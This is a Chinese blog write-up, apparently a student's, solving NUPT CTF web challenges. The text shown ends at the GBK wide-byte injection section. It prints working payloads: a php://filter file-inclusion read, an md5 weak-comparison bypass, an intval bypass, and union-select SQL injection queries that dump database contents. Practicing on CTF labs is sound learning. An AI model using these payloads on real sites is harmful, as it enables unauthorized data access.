
 <!DOCTYPE HTML>
<html lang="en">
<head>
  <meta charset="UTF-8">
  
    <title>南邮ctf--web | Hexo</title>
    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
    
    <meta name="author" content="John Doe">
    

    
    <meta name="description" content="前言菜，就要多做题">
<meta property="og:type" content="article">
<meta property="og:title" content="南邮ctf--web">
<meta property="og:url" content="http://example.com/2019/03/30/%E5%A4%A7%E5%AD%A6CTF/%E5%8D%97%E9%82%AEctf-web/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="前言菜，就要多做题">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/30/ADZ0yV.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/30/ADZcFJ.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/30/ADZTTe.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/30/ADnowT.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/30/ADum0f.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/30/ADun78.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/30/ADKmvR.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/30/ADKuK1.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/30/ADKZ8J.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/30/ADKart.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/30/ADMyTK.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/30/ADQsjs.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/30/ADlY24.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/30/ADlyGD.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/30/ADl5If.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/30/AD3D3D.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/30/AD3LEq.png">
<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/1554034118341.png">
<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/1554034528348.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/31/Ar6RWF.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/31/Ar6yd0.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/31/ArcQYT.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/31/Argr5V.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/31/Ar2pPf.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/31/Ar2seA.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/31/ArRgB9.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/31/ArRcnJ.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/31/ArW1ER.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/31/ArWQb9.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/31/ArfDL4.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/03/31/ArhV6U.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/04/01/AshnVH.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/04/01/Ashuad.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/04/01/As4dmD.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/04/01/AsIhJs.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/04/01/AsoWnK.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/04/01/As72dO.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/04/01/AsHuOx.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/04/01/AsbK3j.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/04/01/Asq9aT.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/04/01/AySuPP.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/04/01/AyS8bj.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/04/14/AOrIJI.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/04/14/AOrHQf.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/04/14/AOcQXV.png">
<meta property="article:published_time" content="2019-03-30T11:01:51.000Z">
<meta property="article:modified_time" content="2019-05-09T08:21:07.409Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="南邮web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.ax1x.com/2019/03/30/ADZ0yV.png">

    
    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
    
    
    <link rel="icon" href="/img/tou1.png">
    
    
    <link rel="apple-touch-icon" href="/img/jacman.jpg">
    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
    
    
<link rel="stylesheet" href="/css/style.css">
<link rel="stylesheet" href="/%02.css">
<link rel="stylesheet" href="/.css">

<meta name="generator" content="Hexo 5.4.0"></head>

  <body>
    <header>
      
<div>
		
			<div id="imglogo">
				<a href="/"><img src="/img/logo.jpg" alt="Hexo" title="Hexo"/></a>
			</div>
			
			<div id="textlogo">
				<h1 class="site-name"><a href="/" title="Hexo">Hexo</a></h1>
				<h2 class="blog-motto"></h2>
			</div>
			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
			</a></div>
			<nav class="animated">
				<ul>
					<ul>
					 
						<li><a href="/">Home</a></li>
					
						<li><a href="/archives">Archives</a></li>
					
						<li><a href="/about">About</a></li>
					
						<li><a href="/tags">Tags</a></li>
					
						<li><a href="/categories">Categories</a></li>
					
					<li>
 					
					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
						<label>Search</label>
						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
						<input type="hidden" name="q" value="site:example.com">
					</form>
					
					</li>
				</ul>
			</nav>			
</div>
    </header>
    <div id="container">
      <div id="main" class="post" itemscope itemprop="blogPost">
  
	<article itemprop="articleBody"> 
		<header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2019/03/30/大学CTF/南邮ctf-web/" title="南邮ctf--web" itemprop="url">南邮ctf--web</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="John Doe" target="_blank" itemprop="author">John Doe</a>
		
  <p class="article-time">
    <time datetime="2019-03-30T11:01:51.000Z" itemprop="datePublished"> Published 2019-03-30</time>
    
  </p>
</header>
	<div class="article-content">
		
		<div id="toc" class="toc-article">
			<strong class="toc-title">Contents</strong>
		
			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">2.1.</span> <span class="toc-text">签到题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#md5-collision"><span class="toc-number">2.2.</span> <span class="toc-text">md5 collision</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AD%BE%E5%88%B02"><span class="toc-number">2.3.</span> <span class="toc-text">签到2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%99%E9%A2%98%E4%B8%8D%E6%98%AFweb"><span class="toc-number">2.4.</span> <span class="toc-text">这题不是web</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B1%82%E5%B1%82%E9%80%92%E8%BF%9B"><span class="toc-number">2.5.</span> <span class="toc-text">层层递进</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AAencode"><span class="toc-number">2.6.</span> <span class="toc-text">AAencode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E8%BA%AB20%E5%B9%B4"><span class="toc-number">2.7.</span> <span class="toc-text">单身20年</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP-decode"><span class="toc-number">2.8.</span> <span class="toc-text">PHP decode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.9.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E8%BA%AB%E4%B8%80%E7%99%BE%E5%B9%B4%E4%B9%9F%E6%B2%A1%E7%94%A8"><span class="toc-number">2.10.</span> <span class="toc-text">单身一百年也没用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Download"><span class="toc-number">2.11.</span> <span class="toc-text">Download</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cookie"><span class="toc-number">2.12.</span> <span class="toc-text">cookie</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MySQL"><span class="toc-number">2.13.</span> <span class="toc-text">MySQL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GBK-Injection"><span class="toc-number">2.14.</span> <span class="toc-text">GBK Injection</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#x00"><span class="toc-number">2.15.</span> <span class="toc-text">&#x2F;x00</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#bypass-again"><span class="toc-number">2.15.1.</span> <span class="toc-text">bypass again</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">2.16.</span> <span class="toc-text">变量覆盖</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E6%98%AF%E4%B8%96%E7%95%8C%E4%B8%8A%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80"><span class="toc-number">2.17.</span> <span class="toc-text">PHP是世界上最好的语言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E8%A3%85%E8%80%85"><span class="toc-number">2.18.</span> <span class="toc-text">伪装者</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#header"><span class="toc-number">2.19.</span> <span class="toc-text">header</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87"><span class="toc-number">2.20.</span> <span class="toc-text">上传绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A51"><span class="toc-number">2.21.</span> <span class="toc-text">SQL注入1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pass-check"><span class="toc-number">2.22.</span> <span class="toc-text">pass check</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B5%B7%E5%90%8D%E5%AD%97%E7%9C%9F%E9%9A%BE"><span class="toc-number">2.23.</span> <span class="toc-text">起名字真难</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE"><span class="toc-number">2.24.</span> <span class="toc-text">密码重置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-Injection"><span class="toc-number">2.25.</span> <span class="toc-text">SQL Injection</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E9%A2%98"><span class="toc-number">2.26.</span> <span class="toc-text">综合题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE2"><span class="toc-number">2.27.</span> <span class="toc-text">密码重置2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.28.</span> <span class="toc-text">PHP反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#file-get-contents"><span class="toc-number">2.29.</span> <span class="toc-text">file_get_contents</span></a></li></ol></li></ol>
		
		</div>
		
		<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>菜，就要多做题<span id="more"></span></p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h4><p>直接看源码就可以了。</p>
<h4 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h4><p>这题是md5的碰撞问题</p>
<p><code>$md51 == $md52</code></p>
<p>md5弱比较，为0e开头的会被识别为科学记数法，结果均为0</p>
<p>payload:<code>?a=aabg7XSs</code>或者<code>?a=240610708)</code></p>
<p>还有这些都是一些常用的。</p>
<blockquote>
<p> QNKCDZO，240610708，s878926199a，s155964671a，s214587387a，s214587387a</p>
</blockquote>
<h4 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h4><p><img src="https://s2.ax1x.com/2019/03/30/ADZ0yV.png" alt="ADZ0yV.png"></p>
<p>要求输入zhimakaimen，但是输入之后也没用。</p>
<p>bp抓包，发现zhimakaimen变成了zhimakaime，少了个n，应该是限制了长度</p>
<p><img src="https://s2.ax1x.com/2019/03/30/ADZcFJ.png" alt="ADZcFJ.png"></p>
<p>直接加上n，然后go，即可得到flag</p>
<h4 id="这题不是web"><a href="#这题不是web" class="headerlink" title="这题不是web"></a>这题不是web</h4><p><img src="https://s2.ax1x.com/2019/03/30/ADZTTe.png" alt="ADZTTe.png"></p>
<p>刚开始有点迷，就一张图，既然他说不是web，就把图下载下来，放到hxd里看一看，搜索nctf，在最后找到flag</p>
<h4 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h4><p>打开之后就是一个普通的网页，题目中说到微博，我还去看了看，啥也没发现，不过也关注了黑客叔叔QAQ。</p>
<p>题目叫层层递进，在网页中找了半天，点了很多网页也没发现什么，只能查看源码，</p>
<p>发现有一个SO.html</p>
<p><img src="https://s2.ax1x.com/2019/03/30/ADnowT.png" alt="ADnowT.png"></p>
<p>访问一下，又出现一个界面，明显不是同一个界面，再看源码，又有一个S0.html，访问，又出现一个界面，源码里是SO.htm，访问，又有一个界面，是S0.html，继续，这次源码里有一个404.html，访问，出现如下：</p>
<p><img src="https://s2.ax1x.com/2019/03/30/ADum0f.png" alt="ADum0f.png"></p>
<p>继续查看源码，发现好大一段注释啊，仔细看看，里面就有flag</p>
<p><img src="https://s2.ax1x.com/2019/03/30/ADun78.png" alt="ADun78.png"></p>
<p>这题还真的是层层递进啊。</p>
<p>还有一种方法，直接扫描了一下网站后台，就可以发现404了，，，，，，</p>
<h4 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a>AAencode</h4><p>打开题目，不知道是什么鬼，</p>
<p><img src="https://s2.ax1x.com/2019/03/30/ADKmvR.png" alt="ADKmvR.png"></p>
<p>Google打开</p>
<p><img src="https://s2.ax1x.com/2019/03/30/ADKuK1.png" alt="ADKuK1.png"></p>
<p>看来是编码问题，Unicode之后，就会得到一段AAencode加密的话</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&#x27;_&#x27;]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &#x27;_&#x27; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#x27;_&#x27;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&#x27;_&#x27;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [c^_^o];(ﾟДﾟ) [&#x27;c&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#x27;o&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&#x27;c&#x27;]+(ﾟДﾟ) [&#x27;o&#x27;]+(ﾟωﾟﾉ +&#x27;_&#x27;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#x27;c&#x27;]+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#x27;o&#x27;]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ];(ﾟДﾟ) [&#x27;_&#x27;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#x27;_&#x27;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&#x27;\\&#x27;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&#x27;_&#x27;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&#x27;\&quot;&#x27;;(ﾟДﾟ) [&#x27;_&#x27;] ( (ﾟДﾟ) [&#x27;_&#x27;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#x27;_&#x27;);</span><br></pre></td></tr></table></figure>

<p>直接放在控制台里跑一下，就行</p>
<p><img src="https://s2.ax1x.com/2019/03/30/ADKZ8J.png" alt="ADKZ8J.png"></p>
<h4 id="单身20年"><a href="#单身20年" class="headerlink" title="单身20年"></a>单身20年</h4><p>说道手速问题，直接bp抓包</p>
<p><img src="https://s2.ax1x.com/2019/03/30/ADKart.png" alt="ADKart.png"></p>
<h4 id="PHP-decode"><a href="#PHP-decode" class="headerlink" title="PHP decode"></a>PHP decode</h4><p>给了一段PHP代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CLsI</span>(<span class="params"><span class="variable">$ZzvSWE</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$ZzvSWE</span> = gzinflate(base64_decode(<span class="variable">$ZzvSWE</span>)); </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$ZzvSWE</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$ZzvSWE</span>[<span class="variable">$i</span>] = chr(ord(<span class="variable">$ZzvSWE</span>[<span class="variable">$i</span>]) - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ZzvSWE</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(CLsI(<span class="string">&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>eval()这个函数运行时，会执行他括号里面的语句，这里面应该是flag，</p>
<p>所以把eval改成echo，放在本地运行一下，就可以输出flag</p>
<p>或者找个在线执行代码的网站，执行一下。</p>
<p><img src="https://s2.ax1x.com/2019/03/30/ADMyTK.png" alt="ADMyTK.png"></p>
<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>既然叫文件包含了，那就文件包含了。</p>
<p>直接拿payload</p>
<blockquote>
<p>index.php?file=php://filter/read=convert.base64-encode/resource=index.php</p>
</blockquote>
<p>以base64编码把index.php源码读出来，然后base64解码，即可得到flag。</p>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/ADQsjs"><img src="https://s2.ax1x.com/2019/03/30/ADQsjs.png" alt="ADQsjs.png"></a></p>
<h4 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h4><p>还是抓包，go了一次之后啥也没有，那就再go一次，得到flag</p>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/ADlY24"><img src="https://s2.ax1x.com/2019/03/30/ADlY24.png" alt="ADlY24.png"></a></p>
<h4 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h4><p>题目似乎坏掉了</p>
<h4 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h4><p>打开题目一个空白页，bp抓包试试，</p>
<p>发现cookie：login=0</p>
<p><img src="https://s2.ax1x.com/2019/03/30/ADlyGD.png" alt="ADlyGD.png"></p>
<p>改成login=1试试，就得到flag了</p>
<h4 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h4><p>提示了robots.txt，那就打开robots.txt看看</p>
<p><img src="https://s2.ax1x.com/2019/03/30/ADl5If.png" alt="ADl5If.png"></p>
<p>tip：sql.php,应该是这个页面的问题，源码中当id=1024时，会输出“no，try again”，id!=1024时，才弹出content(应该有flag)，但是当id=1，2，，，等数字时，也没用弹出，</p>
<p>代码中有个intval函数，这个函数是取整函数，</p>
<p>如果我们输入1024.xxxxxx，如1024.000001的话，intval会取整，那么$id会是1024，但是当判断$_GET[id]==1024时就会为假，因为没有强制类型转化，所以两个一个是1024，一个是1024*10^12，不相等，两个条件同时满足，因此就能绕过得到flag</p>
<p><img src="https://s2.ax1x.com/2019/03/30/AD3D3D.png" alt="AD3D3D.png"></p>
<h4 id="GBK-Injection"><a href="#GBK-Injection" class="headerlink" title="GBK Injection"></a>GBK Injection</h4><p><img src="https://s2.ax1x.com/2019/03/30/AD3LEq.png" alt="AD3LEq.png"></p>
<p>id=1时正常，加上单引号之后，发现单引号被转义了，</p>
<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\1554034118341.png" alt="1554034118341"></p>
<p>再看看题目，肯定是宽字节注入了，页面编码保存为gbk，</p>
<p>宽字节注入，就是为了逃过转义函数的限制，宽字节注入就是利用了mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字，我们可以输入%df试一下。</p>
<p>payload：<code>?id=1%df&#39;</code></p>
<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\1554034528348.png" alt="1554034528348"></p>
<p>可以看到，有了报错信息，这样就可以注入了</p>
<p><img src="https://s2.ax1x.com/2019/03/31/Ar6RWF.png" alt="Ar6RWF.png"></p>
<p>测试后发现只有两列</p>
<p><strong>爆库</strong></p>
<p><code>?id=-1%df&#39; union select 1,database()%23</code></p>
<p><img src="https://s2.ax1x.com/2019/03/31/Ar6yd0.png" alt="Ar6yd0.png"></p>
<p><strong>爆表</strong></p>
<p>`?id=-1%df’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23</p>
<p><img src="https://s2.ax1x.com/2019/03/31/ArcQYT.png" alt="ArcQYT.png"></p>
<p><strong>爆列</strong></p>
<p><code>?id=-1%df&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x637466%23</code></p>
<p>把”ctf“转换成十六进制，挨个都爆了一遍，最终在ctf4中发现flag</p>
<p><img src="https://s2.ax1x.com/2019/03/31/Argr5V.png" alt="Argr5V.png"></p>
<p><strong>爆数据</strong></p>
<p><code>?id=-1%df%27 union select 1,flag from ctf4%23</code></p>
<p><img src="https://s2.ax1x.com/2019/03/31/Ar2pPf.png" alt="Ar2pPf.png"></p>
<p>得到一个flag，提交之后不对，</p>
<p>只能再挨个文件找，在ctf的pw中找到一个，也不对，看来是被别人玩坏了</p>
